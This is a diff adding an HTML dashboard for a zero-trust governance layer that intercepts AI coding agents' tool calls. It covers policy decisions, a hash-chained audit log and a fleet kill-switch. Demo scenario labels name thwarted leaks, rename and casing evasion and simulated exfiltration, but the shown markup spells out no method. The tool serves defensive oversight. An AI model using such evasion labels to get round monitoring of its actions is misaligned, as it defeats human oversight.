@@ -1,0 +1,2013 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Bounded Authority Plane (BAP) Activity Inspector & Live Replayer</title>
+  <script src="https://www.gstatic.com/antigravity/web/dev/tailwindcss.min.js"></script>
+  <style>
+    @keyframes pulse-glow-emerald {
+      0%, 100% { box-shadow: 0 0 15px rgba(16, 185, 129, 0.4); }
+      50% { box-shadow: 0 0 25px rgba(16, 185, 129, 0.8); }
+    }
+    @keyframes pulse-glow-rose {
+      0%, 100% { box-shadow: 0 0 15px rgba(244, 63, 94, 0.4); }
+      50% { box-shadow: 0 0 25px rgba(244, 63, 94, 0.8); }
+    }
+    .glow-emerald { animation: pulse-glow-emerald 2s infinite; }
+    .glow-rose { animation: pulse-glow-rose 1.5s infinite; }
+    .scrollbar-thin::-webkit-scrollbar { width: 6px; height: 6px; }
+    .scrollbar-thin::-webkit-scrollbar-track { background: #0f172a; }
+    .scrollbar-thin::-webkit-scrollbar-thumb { background: #334155; border-radius: 3px; }
+  </style>
+</head>
+<body class="bg-slate-950 text-slate-100 min-h-screen font-sans antialiased flex flex-col">
+
+  <!-- TOP HEADER -->
+  <header class="border-b border-slate-800 bg-slate-900/90 backdrop-blur sticky top-0 z-30 px-6 py-3">
+    <div class="max-w-7xl mx-auto flex flex-wrap items-center justify-between gap-4">
+      <div class="flex items-center space-x-3">
+        <div class="w-10 h-10 rounded-xl bg-gradient-to-tr from-indigo-600 via-cyan-500 to-emerald-400 flex items-center justify-center shadow-lg shadow-cyan-500/20">
+          <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+          </svg>
+        </div>
+        <div>
+          <div class="flex items-center space-x-2">
+            <h1 class="text-lg font-bold tracking-tight text-white">BAP Activity Inspector & Replayer</h1>
+            <span class="px-2 py-0.5 text-xs font-semibold rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">Zero-Trust LTD</span>
+          </div>
+          <p class="text-xs text-slate-400">Local Trusted Daemon (<code class="text-cyan-400">bapedge</code>) & Central Control Plane Governance</p>
+        </div>
+      </div>
+
+      <!-- Quick Metrics Ribbon -->
+      <div class="flex items-center space-x-3 text-xs">
+        <div class="bg-slate-800/80 border border-slate-700/60 rounded-lg px-3 py-1.5 flex items-center space-x-2">
+          <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
+          <span class="text-slate-400">Control Plane:</span>
+          <span id="stat-cp-status" class="font-semibold text-emerald-400">ONLINE (8080)</span>
+        </div>
+
+        <div class="bg-slate-800/80 border border-slate-700/60 rounded-lg px-3 py-1.5 flex items-center space-x-2">
+          <span class="text-slate-400">Trust Domain:</span>
+          <span id="stat-trust-domain" class="font-mono text-cyan-400">bap.internal</span>
+        </div>
+
+        <div class="bg-slate-800/80 border border-slate-700/60 rounded-lg px-3 py-1.5 flex items-center space-x-2">
+          <span class="text-slate-400">Events:</span>
+          <span id="stat-total-events" class="font-bold text-white">0</span>
+        </div>
+
+        <div class="bg-emerald-950/40 border border-emerald-800/40 rounded-lg px-3 py-1.5 flex items-center space-x-2 text-emerald-400">
+          <span>Allowed:</span>
+          <span id="stat-allowed" class="font-bold">0</span>
+        </div>
+
+        <div class="bg-rose-950/40 border border-rose-800/40 rounded-lg px-3 py-1.5 flex items-center space-x-2 text-rose-400">
+          <span>Denied:</span>
+          <span id="stat-denied" class="font-bold">0</span>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- FLOATING LIVE TOAST NOTIFICATIONS (TOP-RIGHT) -->
+  <div id="toast-container" class="fixed top-5 right-5 z-50 flex flex-col space-y-2 pointer-events-none max-w-sm w-full"></div>
+
+  <!-- MAIN CONTAINER -->
+  <main class="max-w-7xl mx-auto w-full p-6 space-y-6 flex-1">
+
+    <!-- EMERGENCY FLEET KILL-SWITCH ALERT BANNER -->
+    <div id="emergency-kill-banner" class="hidden bg-rose-950/95 border-2 border-rose-500 rounded-2xl p-4 shadow-2xl flex flex-col md:flex-row items-center justify-between gap-4 glow-rose transition-all">
+      <div class="flex items-center space-x-3.5">
+        <div class="w-10 h-10 rounded-xl bg-rose-600/30 border border-rose-500 flex items-center justify-center text-xl animate-pulse">
+          🚨
+        </div>
+        <div>
+          <div class="text-sm font-black tracking-wider text-rose-200 flex items-center space-x-2">
+            <span>EMERGENCY FLEET KILL-SWITCH ENGAGED</span>
+            <span class="px-2 py-0.5 rounded bg-rose-500 text-white text-[10px] font-mono font-bold">CISO OVERRIDE</span>
+          </div>
+          <p class="text-xs text-rose-300/90 mt-0.5 font-mono">ALL AGENT WORKLOADS GLOBALLY FROZEN. Zero-Trust perimeter is dropping all agent execution requests.</p>
+        </div>
+      </div>
+      <button id="btn-banner-restore" class="px-4 py-2 bg-rose-600 hover:bg-rose-500 text-white text-xs font-bold rounded-xl shadow-lg transition flex items-center space-x-1.5 cursor-pointer whitespace-nowrap">
+        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg>
+        <span>DISENGAGE KILL-SWITCH & RESTORE FLEET</span>
+      </button>
+    </div>
+
+    <!-- EXECUTIVE DEMONSTRATION COCKPIT (FOR CIO / CISO) -->
+    <section class="bg-gradient-to-r from-slate-900 via-indigo-950/40 to-slate-900 border border-indigo-500/30 rounded-2xl p-4 shadow-2xl space-y-3 relative overflow-hidden">
+      <div class="flex flex-wrap items-center justify-between gap-3 border-b border-slate-800/80 pb-3">
+        <div class="flex items-center space-x-2.5">
+          <span class="px-2 py-1 bg-indigo-500/20 border border-indigo-500/40 text-indigo-300 rounded text-xs font-bold font-mono">CIO COCKPIT</span>
+          <span class="text-sm font-bold text-white tracking-wide">Interactive Executive Demo Controls</span>
+          <span class="text-xs text-slate-400 font-mono hidden sm:inline">| 1-Click Zero-Trust Validation</span>
+        </div>
+        <div class="flex items-center space-x-4 text-xs font-mono">
+          <span class="text-slate-400">Developer Friction: <strong class="text-emerald-400 font-bold">0ms</strong></span>
+          <span class="text-slate-400">Avg Policy Latency: <strong id="metric-avg-latency" class="text-cyan-400 font-bold">1.2ms</strong></span>
+          <span class="text-slate-400">SOC 2 / Merkle Chain: <strong id="metric-chain-state" class="text-emerald-400 font-bold">100% VALID</strong></span>
+        </div>
+      </div>
+
+      <!-- 1-Click Action Buttons Ribbon -->
+      <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3 pt-1">
+        
+        <!-- Button 1: Safe Multi-Stage Build (< 2ms) -->
+        <button id="btn-exec-safe" class="group bg-slate-800/90 hover:bg-emerald-950/60 border border-slate-700 hover:border-emerald-500/60 rounded-xl p-3 text-left transition-all shadow-md flex items-start space-x-3 cursor-pointer">
+          <div class="p-2 bg-emerald-500/10 rounded-lg text-emerald-400 group-hover:bg-emerald-500/20 group-hover:scale-105 transition">
+            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
+          </div>
+          <div>
+            <div class="text-xs font-bold text-white group-hover:text-emerald-300 flex items-center space-x-1.5">
+              <span>⚡ 1-Click Safe Pass</span>
+              <span class="text-[10px] text-emerald-400 font-mono bg-emerald-500/10 px-1.5 py-0.2 rounded border border-emerald-500/30">&lt; 2ms</span>
+            </div>
+            <p class="text-[11px] text-slate-400 mt-0.5 leading-snug">Complex multi-stage dev pipeline (Zero friction pass)</p>
+          </div>
+        </button>
+
+        <!-- Button 2: Malicious Attack PEP Deny -->
+        <button id="btn-exec-attack" class="group bg-slate-800/90 hover:bg-rose-950/60 border border-slate-700 hover:border-rose-500/60 rounded-xl p-3 text-left transition-all shadow-md flex items-start space-x-3 cursor-pointer">
+          <div class="p-2 bg-rose-500/10 rounded-lg text-rose-400 group-hover:bg-rose-500/20 group-hover:scale-105 transition">
+            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
+          </div>
+          <div>
+            <div class="text-xs font-bold text-white group-hover:text-rose-300 flex items-center space-x-1.5">
+              <span>🛡️ 1-Click Attack Block</span>
+              <span class="text-[10px] text-rose-400 font-mono bg-rose-500/10 px-1.5 py-0.2 rounded border border-rose-500/30">PEP Block</span>
+            </div>
+            <p class="text-[11px] text-slate-400 mt-0.5 leading-snug">Simulate rogue exfiltration dropped at perimeter</p>
+          </div>
+        </button>
+
+        <!-- Button 3: Fleet Scale Toggle (5 vs 25 Agents) -->
+        <button id="btn-toggle-scale" class="group bg-slate-800/90 hover:bg-cyan-950/60 border border-slate-700 hover:border-cyan-500/60 rounded-xl p-3 text-left transition-all shadow-md flex items-start space-x-3 cursor-pointer">
+          <div class="p-2 bg-cyan-500/10 rounded-lg text-cyan-400 group-hover:bg-cyan-500/20 group-hover:scale-105 transition">
+            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"/></svg>
+          </div>
+          <div>
+            <div class="text-xs font-bold text-white group-hover:text-cyan-300 flex items-center space-x-1">
+              <span id="label-scale-btn">👥 Scale to 25 Agents</span>
+            </div>
+            <p class="text-[11px] text-slate-400 mt-0.5 leading-snug" id="desc-scale-btn">Preview enterprise high-density mesh</p>
+          </div>
+        </button>
+
+        <!-- Button 4: Global Kill-Switch & Chain Verification -->
+        <div class="flex items-center space-x-2">
+          <button id="btn-toggle-killswitch" class="flex-1 group bg-slate-800/90 hover:bg-rose-950/60 border border-slate-700 hover:border-rose-500/60 rounded-xl p-3 text-left transition-all shadow-md flex items-start space-x-2.5 cursor-pointer">
+            <div class="p-2 bg-rose-500/10 rounded-lg text-rose-400 group-hover:bg-rose-500/20 group-hover:scale-105 transition">
+              <span class="text-base leading-none">🚨</span>
+            </div>
+            <div>
+              <div class="text-xs font-bold text-white group-hover:text-rose-300">
+                <span id="label-kill-btn">Kill-Switch</span>
+              </div>
+              <p class="text-[10px] text-slate-400 mt-0.5" id="desc-kill-btn">Global freeze</p>
+            </div>
+          </button>
+
+          <button id="btn-verify-chain-quick" title="Verify SHA-256 Merkle Chain Integrity" class="group bg-slate-800/90 hover:bg-emerald-950/60 border border-slate-700 hover:border-emerald-500/60 rounded-xl p-3 text-center transition-all shadow-md cursor-pointer flex flex-col items-center justify-center">
+            <span class="text-base leading-none">🔐</span>
+            <span class="text-[9px] font-bold text-emerald-400 mt-1 font-mono">Verify</span>
+          </button>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- LIVE FLEET RADAR & PRESENCE BANNER -->
+    <section id="live-fleet-radar" class="bg-gradient-to-r from-slate-900 via-slate-900/90 to-slate-900 border border-slate-800 rounded-2xl p-4 shadow-xl flex flex-col md:flex-row items-center justify-between gap-4 relative overflow-hidden">
+      <!-- Animated radar sweep glow -->
+      <div class="absolute inset-0 bg-gradient-to-r from-transparent via-cyan-500/5 to-transparent pointer-events-none -translate-x-full animate-[shimmer_3s_infinite]"></div>
+
+      <div class="flex items-center space-x-3.5 z-10">
+        <div class="relative flex items-center justify-center">
+          <span class="w-3.5 h-3.5 rounded-full bg-emerald-500 animate-ping absolute opacity-75"></span>
+          <span class="w-3 h-3 rounded-full bg-emerald-400 relative shadow-lg shadow-emerald-500/50"></span>
+        </div>
+        <div>
+          <div class="text-xs font-bold text-white flex items-center space-x-2">
+            <span>LIVE WORKLOAD RADAR</span>
+            <span id="radar-live-count" class="px-2 py-0.5 rounded bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 text-[10px] font-mono">0 ACTIVE AGENTS</span>
+          </div>
+          <p id="radar-summary-text" class="text-[11px] text-slate-400 mt-0.5 font-mono">Monitoring edge sessions & heartbeats on port 8080</p>
+        </div>
+      </div>
+
+      <!-- Active Client Chips / Badges -->
+      <div id="radar-clients-chips" class="flex flex-wrap items-center gap-2 z-10">
+        <span class="text-xs text-slate-500 font-mono italic">No client sessions active</span>
+      </div>
+    </section>
+
+    <!-- INTERACTIVE CONTROL & REPLAYER BAR -->
+    <section class="bg-slate-900 border border-slate-800 rounded-2xl p-4 shadow-xl flex flex-col md:flex-row items-center justify-between gap-4">
+      <!-- Playback Controls -->
+      <div class="flex items-center space-x-2 w-full md:w-auto">
+        <button id="btn-reset" title="Reset to Beginning" class="p-2 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-lg transition border border-slate-700">
+          <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 19l-7-7 7-7m8 14l-7-7 7-7"/></svg>
+        </button>
+        <button id="btn-step-back" title="Previous Event" class="p-2 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-lg transition border border-slate-700">
+          <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"/></svg>
+        </button>
+        <button id="btn-play-pause" class="px-4 py-2 bg-cyan-600 hover:bg-cyan-500 text-white font-semibold rounded-lg transition flex items-center space-x-2 shadow-lg shadow-cyan-600/30">
+          <svg id="icon-play" class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
+          <svg id="icon-pause" class="w-4 h-4 hidden" fill="currentColor" viewBox="0 0 24 24"><path d="M6 19h4V5H6v14zm8-14v14h4V5h-4z"/></svg>
+          <span id="text-play">Play Demo</span>
+        </button>
+        <button id="btn-step-fwd" title="Next Event" class="p-2 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-lg transition border border-slate-700">
+          <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/></svg>
+        </button>
+        <button id="btn-end" title="Jump to Latest" class="p-2 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-lg transition border border-slate-700">
+          <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 5l7 7-7 7M5 5l7 7-7 7"/></svg>
+        </button>
+
+        <!-- Speed Selector -->
+        <select id="select-speed" class="bg-slate-800 border border-slate-700 text-xs rounded-lg px-2.5 py-2 text-slate-300 focus:ring-1 focus:ring-cyan-500">
+          <option value="2000">0.5x Speed</option>
+          <option value="1000" selected>1.0x Speed</option>
+          <option value="500">2.0x Speed</option>
+          <option value="200">5.0x Speed</option>
+        </select>
+      </div>
+
+      <!-- Scrubber Timeline Slider -->
+      <div class="flex-1 w-full flex items-center space-x-3 px-2">
+        <span id="playback-counter" class="text-xs font-mono text-slate-400 min-w-[55px]">0 / 0</span>
+        <input id="timeline-slider" type="range" min="0" max="0" value="0" class="w-full h-2 bg-slate-800 rounded-lg appearance-none cursor-pointer accent-cyan-500">
+      </div>
+
+      <!-- Mode & Scenario Switcher -->
+      <div class="flex items-center space-x-2 w-full md:w-auto">
+        <select id="scenario-selector" class="bg-slate-800 border border-slate-700 text-xs rounded-lg px-3 py-2 text-slate-200 font-medium focus:ring-1 focus:ring-cyan-500">
+          <option value="live">🔴 Live Workspace Activity</option>
+          <option value="claude-session" selected>Scenario 1: Claude Code Hook & Leaks Thwarted</option>
+          <option value="threats">Scenario 2: Evasive Renames & Casing Evasion</option>
+          <option value="fleet">Scenario 3: Multi-Instance Fleet & SPIFFE</option>
+          <option value="offline">Scenario 4: Control Plane Outage (0ms Offline)</option>
+        </select>
+
+        <button id="btn-refresh-live" title="Force Refresh from Control Plane" class="px-3 py-2 bg-slate-800 hover:bg-slate-700 text-xs text-slate-300 font-medium rounded-lg border border-slate-700 transition flex items-center space-x-1">
+          <svg class="w-3.5 h-3.5 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg>
+          <span>Sync</span>
+        </button>
+      </div>
+    </section>
+
+    <!-- INTERACTIVE PACKET FLOW & ZERO-TRUST TOPOLOGY -->
+    <section class="bg-slate-900 border border-slate-800 rounded-2xl p-5 shadow-xl relative overflow-hidden">
+      <div class="flex items-center justify-between mb-3">
+        <h2 class="text-sm font-semibold uppercase tracking-wider text-slate-400 flex items-center space-x-2">
+          <svg class="w-4 h-4 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
+          <span>Zero-Trust Execution Pipeline (Active Flow)</span>
+        </h2>
+        <div id="flow-status-banner" class="text-xs px-3 py-1 rounded-full font-mono bg-slate-800 text-slate-400 border border-slate-700">
+          Awaiting execution event...
+        </div>
+      </div>
+
+      <!-- Node Flow Grid -->
+      <div class="grid grid-cols-1 md:grid-cols-5 gap-3 relative z-10 pt-2 pb-2">
+        
+        <!-- Node 1: AI Agent -->
+        <div id="node-agent" class="bg-slate-800/80 border-2 border-slate-700 rounded-xl p-3.5 text-center transition-all duration-300">
+          <div class="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Origin</div>
+          <div class="text-base font-bold text-slate-200 mt-1 flex items-center justify-center space-x-1">
+            <span id="flow-agent-name">Claude Code</span>
+          </div>
+          <div class="text-[10px] text-slate-400 mt-0.5">PreToolUse Hook (Ollama)</div>
+          <div class="mt-2 text-[10px] font-mono bg-slate-950 px-2 py-1 rounded text-cyan-300 truncate" id="flow-agent-pid">PID: 24000</div>
+        </div>
+
+        <!-- Node 2: Interceptor -->
+        <div id="node-hook" class="bg-slate-800/80 border-2 border-slate-700 rounded-xl p-3.5 text-center transition-all duration-300">
+          <div class="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Interception Layer</div>
+          <div class="text-base font-bold text-slate-200 mt-1">cchook / shim</div>
+          <div class="text-[10px] text-slate-400 mt-0.5">Stdin JSON Sniffing</div>
+          <div class="mt-2 text-[10px] font-mono bg-slate-950 px-2 py-1 rounded text-slate-400" id="flow-hook-status">Active Listener</div>
+        </div>
+
+        <!-- Node 3: BAP Edge Broker (LTD) -->
+        <div id="node-edge" class="bg-slate-800/80 border-2 border-slate-700 rounded-xl p-3.5 text-center transition-all duration-300">
+          <div class="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Edge PEP (LTD)</div>
+          <div class="text-base font-bold text-cyan-400 mt-1">bapedge.exe</div>
+          <div class="text-[10px] text-slate-400 mt-0.5">Sub-2ms Zero-Trust Broker</div>
+          <div class="mt-2 text-[10px] font-mono bg-slate-950 px-2 py-1 rounded text-emerald-400" id="flow-edge-eval">Latency: ~1ms</div>
+        </div>
+
+        <!-- Node 4: Cedar Policy Engine -->
+        <div id="node-cedar" class="bg-slate-800/80 border-2 border-slate-700 rounded-xl p-3.5 text-center transition-all duration-300">
+          <div class="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Decision Core</div>
+          <div class="text-base font-bold text-slate-200 mt-1" id="flow-decision-text">Cedar Engine</div>
+          <div class="text-[10px] text-slate-400 mt-0.5">Forbid > Permit Invariants</div>
+          <div class="mt-2 text-[10px] font-mono bg-slate-950 px-2 py-1 rounded text-slate-400 truncate" id="flow-cedar-rule">Rule: In-Process</div>
+        </div>
+
+        <!-- Node 5: Destination -->
+        <div id="node-dest" class="bg-slate-800/80 border-2 border-slate-700 rounded-xl p-3.5 text-center transition-all duration-300">
+          <div class="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">Target Execution</div>
+          <div class="text-base font-bold text-slate-200 mt-1" id="flow-target-text">Host OS Shell</div>
+          <div class="text-[10px] text-slate-400 mt-0.5">Sandboxed Process</div>
+          <div class="mt-2 text-[10px] font-mono bg-slate-950 px-2 py-1 rounded text-slate-400 truncate" id="flow-target-status">Enforced</div>
+        </div>
+
+      </div>
+
+      <!-- Command Banner -->
+      <div class="mt-3 bg-slate-950/90 border border-slate-800 rounded-xl p-3 flex flex-wrap items-center justify-between gap-3 text-xs">
+        <div class="flex items-center space-x-2">
+          <span class="text-slate-500 font-mono">CMD:</span>
+          <code id="flow-command" class="font-mono text-cyan-300 font-semibold text-sm">git status</code>
+        </div>
+        <div class="flex items-center space-x-4 font-mono">
+          <span class="text-slate-400">Decision: <strong id="flow-decision-badge" class="px-2 py-0.5 rounded text-emerald-400 bg-emerald-500/10 border border-emerald-500/30">ALLOW</strong></span>
+          <span class="text-slate-400">Exit Code: <strong id="flow-exit-code" class="text-slate-200">0</strong></span>
+          <span class="text-slate-400">Latency: <strong id="flow-duration" class="text-cyan-400">2ms</strong></span>
+        </div>
+      </div>
+    </section>
+
+    <!-- MULTI-TAB VIEW (TIMELINE / FLEET / AUDIT CHAIN / CEDAR POLICY) -->
+    <div class="space-y-4">
+      
+      <!-- Tab Buttons -->
+      <div class="flex items-center space-x-2 border-b border-slate-800 pb-2">
+        <button id="tab-btn-timeline" class="tab-btn px-4 py-2 text-xs font-bold rounded-lg bg-cyan-600/20 text-cyan-300 border border-cyan-500/30 transition flex items-center space-x-1.5">
+          <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
+          <span>Activity Stream & Replayer</span>
+        </button>
+
+        <button id="tab-btn-sessions" class="tab-btn px-4 py-2 text-xs font-bold rounded-lg text-slate-400 hover:text-slate-200 hover:bg-slate-800 transition flex items-center space-x-1.5">
+          <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"/></svg>
+          <span>Agent Sessions</span>
+          <span id="sessions-count-pill" class="ml-1 px-1.5 py-0.2 bg-emerald-500/20 text-emerald-400 border border-emerald-500/40 rounded-full text-[10px]">0</span>
+        </button>
+
+        <button id="tab-btn-fleet" class="tab-btn px-4 py-2 text-xs font-bold rounded-lg text-slate-400 hover:text-slate-200 hover:bg-slate-800 transition flex items-center space-x-1.5">
+          <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 012-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10"/></svg>
+          <span>SPIFFE Workload Registry</span>
+        </button>
+
+        <button id="tab-btn-chain" class="tab-btn px-4 py-2 text-xs font-bold rounded-lg text-slate-400 hover:text-slate-200 hover:bg-slate-800 transition flex items-center space-x-1.5">
+          <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1"/></svg>
+          <span>Tamper-Evident SHA-256 Chain</span>
+        </button>
+
+        <button id="tab-btn-cedar" class="tab-btn px-4 py-2 text-xs font-bold rounded-lg text-slate-400 hover:text-slate-200 hover:bg-slate-800 transition flex items-center space-x-1.5">
+          <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg>
+          <span>Cedar Rules Matrix</span>
+        </button>
+      </div>
+
+      <!-- TAB 1: TIMELINE / ACTIVITY STREAM -->
+      <div id="tab-pane-timeline" class="tab-pane block space-y-4">
+        
+        <!-- Filters Ribbon -->
+        <div class="flex flex-wrap items-center justify-between gap-3 text-xs">
+          <div class="flex flex-wrap items-center gap-2">
+            <span class="text-slate-400">Filter Source:</span>
+            <button data-filter-src="all" class="filter-src-btn px-2.5 py-1 rounded-md bg-slate-800 text-white font-medium border border-slate-700">All</button>
+            <button data-filter-src="antigravity" class="filter-src-btn px-2.5 py-1 rounded-md bg-slate-900 text-slate-400 border border-slate-800 hover:bg-slate-800">Antigravity</button>
+            <button data-filter-src="claude-code" class="filter-src-btn px-2.5 py-1 rounded-md bg-slate-900 text-slate-400 border border-slate-800 hover:bg-slate-800">Claude Code</button>
+            <button data-filter-src="copilot" class="filter-src-btn px-2.5 py-1 rounded-md bg-slate-900 text-slate-400 border border-slate-800 hover:bg-slate-800">Copilot</button>
+            <button data-filter-src="cli" class="filter-src-btn px-2.5 py-1 rounded-md bg-slate-900 text-slate-400 border border-slate-800 hover:bg-slate-800">Edge CLI</button>
+            <button data-filter-src="controlplane" class="filter-src-btn px-2.5 py-1 rounded-md bg-slate-900 text-slate-400 border border-slate-800 hover:bg-slate-800">Control Plane</button>
+          </div>
+
+          <div class="flex items-center space-x-3">
+            <div class="flex items-center space-x-1.5">
+              <span class="text-slate-400">Session:</span>
+              <select id="filter-session-select" class="bg-slate-900 border border-slate-700 text-slate-200 rounded px-2 py-1 text-xs font-mono">
+                <option value="all">All Sessions</option>
+              </select>
+            </div>
+
+            <div class="flex items-center space-x-1.5">
+              <span class="text-slate-400">Decision:</span>
+              <button data-filter-dec="all" class="filter-dec-btn px-2.5 py-1 rounded-md bg-slate-800 text-white font-medium border border-slate-700">All</button>
+              <button data-filter-dec="allow" class="filter-dec-btn px-2.5 py-1 rounded-md bg-slate-900 text-slate-400 border border-slate-800 hover:bg-slate-800">Allow Only</button>
+              <button data-filter-dec="deny" class="filter-dec-btn px-2.5 py-1 rounded-md bg-slate-900 text-slate-400 border border-slate-800 hover:bg-slate-800">Deny Only</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Event Cards List -->
+        <div id="event-cards-container" class="space-y-2.5">
+          <!-- Populated by JavaScript -->
+        </div>
+      </div>
+
+      <!-- TAB 2: SPIFFE REGISTRY -->
+      <div id="tab-pane-fleet" class="tab-pane hidden space-y-4">
+        <div class="bg-slate-900 border border-slate-800 rounded-xl overflow-hidden shadow-lg">
+          <div class="p-4 border-b border-slate-800 flex justify-between items-center">
+            <div>
+              <h3 class="text-sm font-bold text-white">Registered Agents & SPIFFE Workload Identities</h3>
+              <p class="text-xs text-slate-400">Multi-instance quota management and cryptographically attested agent SVIDs</p>
+            </div>
+            <span class="px-3 py-1 text-xs font-mono rounded bg-cyan-950 text-cyan-400 border border-cyan-800">Trust Domain: <span class="font-bold">bap.internal</span></span>
+          </div>
+
+          <div class="overflow-x-auto">
+            <table class="w-full text-left text-xs text-slate-300">
+              <thead class="bg-slate-950 text-slate-400 font-semibold border-b border-slate-800 uppercase">
+                <tr>
+                  <th class="px-4 py-3">Agent ID</th>
+                  <th class="px-4 py-3">App ID</th>
+                  <th class="px-4 py-3">Instance</th>
+                  <th class="px-4 py-3">SPIFFE Workload URI</th>
+                  <th class="px-4 py-3">Status</th>
+                  <th class="px-4 py-3">Binary Hash Attestation</th>
+                  <th class="px-4 py-3">Last Heartbeat</th>
+                </tr>
+              </thead>
+              <tbody id="fleet-table-body" class="divide-y divide-slate-800">
+                <!-- Populated by JavaScript -->
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+
+      <!-- TAB 3: TAMPER-EVIDENT HASH CHAIN -->
+      <div id="tab-pane-chain" class="tab-pane hidden space-y-4">
+        <div class="bg-slate-900 border border-slate-800 rounded-xl p-5 shadow-lg space-y-4">
+          <div class="flex items-center justify-between">
+            <div>
+              <h3 class="text-sm font-bold text-white">Central Immutable SHA-256 Hash Chain</h3>
+              <p class="text-xs text-slate-400">Cryptographically linked audit chain: H<sub>n</sub> = SHA256(H<sub>n-1</sub> || EventPayload)</p>
+            </div>
+            <div id="chain-validation-badge" class="px-3 py-1 rounded-full text-xs font-bold bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 flex items-center space-x-1">
+              <span>●</span>
+              <span>CHAIN VALID (Genesis Verified)</span>
+            </div>
+          </div>
+
